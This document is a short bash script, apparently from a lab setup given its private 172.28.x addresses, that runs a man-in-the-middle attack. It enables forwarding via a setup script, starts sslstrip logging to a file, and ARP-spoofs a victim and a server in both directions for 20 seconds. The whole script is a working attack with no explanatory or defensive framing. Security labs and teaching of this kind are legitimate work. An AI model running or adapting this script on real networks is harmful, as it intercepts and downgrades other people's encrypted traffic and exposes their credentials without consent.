#!/bin/bash

# Setup IP forwarding and iptables
./setup.sh

# Start sslstrip
echo "[*] Starting sslstrip..."
sslstrip -l 8080 -f -a -w sslstrip.log &
SSL_PID=$!

# Start arpspoof (Targeting Victim 172.28.0.30 and Server 172.28.0.20)
# Since they are on the same subnet, we must spoof the Server to the Victim, not the Gateway.
echo "[*] Starting arpspoof..."
arpspoof -i eth0 -t 172.28.0.30 172.28.0.20 >/dev/null 2>&1 &
ARP1=$!
arpspoof -i eth0 -t 172.28.0.20 172.28.0.30 >/dev/null 2>&1 &
ARP2=$!

echo "[+] Attack running for 20 seconds..."
sleep 20

echo "[*] Stopping attack..."
kill $ARP1
kill $ARP2
kill $SSL_PID
